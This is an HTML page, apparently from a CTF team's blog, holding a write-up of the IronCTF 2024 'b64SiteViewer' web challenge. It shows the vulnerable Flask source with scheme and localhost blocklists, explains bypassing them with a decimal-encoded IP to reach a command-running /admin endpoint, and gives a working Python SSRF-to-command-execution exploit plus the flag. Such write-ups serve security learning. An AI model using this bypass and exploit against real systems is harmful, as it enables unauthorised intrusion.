@@ -1,0 +1,518 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>b64SiteViewer - ByteTheCookies</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="ByteTheCookies" />
+    
+
+    
+        <meta property="og:url" content="http://localhost:1313/writeups/ironctf2024/b64siteviewer/">
+  <meta property="og:site_name" content="ByteTheCookies">
+  <meta property="og:title" content="b64SiteViewer">
+  <meta property="og:description" content="b64SiteViewer Description: This is one of the challenges added later, but despite that it wasn’t very complex, in fact the most complex part wasn’t even the web part, but despite that the challenge was still really nice
+Introduction We are faced with a very simple application in which, given a url, the base64 of the page content is given back to us, plus there is a special endpoint that allows us to execute certain commands">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-10-07T22:24:02+02:00">
+    <meta property="article:modified_time" content="2024-10-07T22:24:02+02:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Filter Bypass &#43; RCE">
+    <meta property="article:tag" content="431 Points">
+    <meta property="article:tag" content="104 Solves">
+    <meta property="article:tag" content="4rUN">
+
+    
+
+    
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="b64SiteViewer">
+  <meta name="twitter:description" content="b64SiteViewer Description: This is one of the challenges added later, but despite that it wasn’t very complex, in fact the most complex part wasn’t even the web part, but despite that the challenge was still really nice
+Introduction We are faced with a very simple application in which, given a url, the base64 of the page content is given back to us, plus there is a special endpoint that allows us to execute certain commands">
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.js" integrity=""></script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/user.css">
+
+    
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li><li>
+                            <a href="/contacts/">✉️ Contacts</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">ByteTheCookies</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/contacts/" class="pure-menu-link">✉️ Contacts</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#bypass-the-first-filter">Bypass the first filter</a></li>
+        <li><a href="#bypassing-the-second-filter">Bypassing the second filter</a></li>
+        <li><a href="#final-exploit">Final exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">Web</div>
+
+  
+    <div class="badge">Python</div>
+
+  
+    <div class="badge">Filter bypass &#43; RCE</div>
+
+  
+    <div class="badge">431 points</div>
+
+  
+    <div class="badge">104 solves</div>
+
+  
+    <div class="badge">4rUN</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Oct 7, 2024
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>b64SiteViewer</h1>
+<p><strong>Description</strong>: This is one of the challenges added later, but despite that it wasn&rsquo;t very complex, in fact the most complex part wasn&rsquo;t even the web part, but despite that the challenge was still really nice</p>
+
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>We are faced with a very simple application in which, given a url, the base64 of the page content is given back to us, plus there is a special endpoint that allows us to execute certain commands</p>
+
+<h2 id="source" class="header-anchor-wrapper">Source
+  <a href="#source" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>There are two endpoints of interest to us, the first of which is this one, which, as we can see, has several filters, especially those that do not allow us to access the localhost (very strange at first glance, you might think).</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: app.py
+
+@app.route('/',methods=['GET','POST'])
+def home():
+    if request.method=='GET':
+        return render_template('home.html')
+    if request.method=='POST':
+        try:
+            url=request.form.get('url')
+            scheme=urlparse(url).scheme
+            hostname=urlparse(url).hostname
+            blacklist_scheme=['file','gopher','php','ftp','dict','data']
+            blacklist_hostname=['127.0.0.1','localhost','0.0.0.0','::1','::ffff:127.0.0.1']
+            if scheme in blacklist_scheme:
+                return render_template_string('blocked scheme')
+            if hostname in blacklist_hostname:
+                return render_template_string('blocked host')
+            t=urllib.request.urlopen(url)
+            content = t.read()
+            output=base64.b64encode(content)
+            return (f'''base64 version of the site:
+                {output[:1000]}''')
+        except Exception as e:
+                print(e)
+                return f&quot; An error occurred: {e} - Unable to visit this site, try some other website.&quot;
+
+
+</code></pre>
+<p>We are blocked from accessing the localhost mainly to prevent us from accessing the admin endpoint, which, as we can clearly see, blocks all IPs that are not 127.0.0.1</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">
+@app.route('/admin')
+def admin():
+    remote_addr = request.remote_addr
+
+    if remote_addr in ['127.0.0.1', 'localhost']:
+        cmd=request.args.get('cmd','id')
+        cmd_blacklist=['REDACTED']
+        if &quot;'&quot; in cmd or '&quot;' in cmd:
+            return render_template_string('Command blocked')
+        for i in cmd_blacklist:
+            if i in cmd:
+                return render_template_string('Command blocked')
+        print(f&quot;Executing: {cmd}&quot;)
+        res= subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return res.stdout
+    else:
+        return render_template_string(&quot;Don't hack me&quot;)
+
+</code></pre>
+<p>The admin endpoint also takes as parameter a CMD argument, which is a bash command that will be executed (Having first checked it with a blacklist)</p>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>The goal is to reach /admin and execute a command to get the flag</p>
+<p>The solution is divided into two phases</p>
+<ol>
+<li>Bypass the filter in /</li>
+<li>Bypass the blacklist in /admin (Blacklist we don&rsquo;t know)</li>
+</ol>
+
+<h3 id="bypass-the-first-filter" class="header-anchor-wrapper">Bypass the first filter
+  <a href="#bypass-the-first-filter" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<p>In the endpoint, the hostname check is not really done correctly because it takes the hostname but does not check what format it is in or that it is valid etc and just does a very trivial comparison, so we just need to represent the IP with a different number system to bypass the filter.</p>
+
+<h3 id="bypassing-the-second-filter" class="header-anchor-wrapper">Bypassing the second filter
+  <a href="#bypassing-the-second-filter" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<p>The second blacklist is much more complex, in fact initially I had many problems to understand, and especially to understand how to get the flag, as all the commands to access the ENV were blocked, but the solution as usual is much more trivial, in fact to leak the blacklist is enough to make a tail (which fortunately was not blocked) and modify the offsets with the parameters we can read part of the blacklist, Finally to get the flag is actually very simple, in fact using tail on the run. sh we can see which is the file where the environment variable of the flag is created and therefore where we can find the</p>
+
+<h3 id="final-exploit" class="header-anchor-wrapper">Final exploit
+  <a href="#final-exploit" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
+
+#!/usr/bin/python3
+
+import requests
+import urllib.parse
+import base64
+
+BASE_URL = &quot;https://b64siteviewer.1nf1n1ty.team/&quot;
+
+PAYLOAD_CMD = urllib.parse.quote(&quot;tail run???&quot;)
+URL_HOOK = &quot;http://2130706433:5000/admin?cmd=&quot; + PAYLOAD_CMD # We use 2130706433 instead of 127.0.0.1 because is blocked by the WAF
+
+def send_url(url):
+  data = {&quot;url&quot;: url}
+  response = requests.post(BASE_URL, data=data)
+  try:
+    return response.text.split(&quot;base64 version of the site:&quot;)[1].strip()[2:-1], True
+  except:
+    return response.text, False
+
+def main():
+  print(&quot;[+] URL: &quot;, URL_HOOK)
+  res_base64,status = send_url(URL_HOOK)
+  if status:
+    print(&quot;[+] Result of exploit: &quot;, base64.b64decode(res_base64).decode())
+  else:
+    print(f&quot;[+] Error in the requests: {res_base64}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+  main()
+
+
+# goodluck by @akiidjk
+
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: ironCTF{y0u4r3r0ck1n6k33ph4ck1n6}&quot;
+</code></pre>
+<p align='right'>Author: akiidjk </p>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2024 by ByteTheCookies Team | v1.0</article>
+</footer>
+
+</body>
+</html>
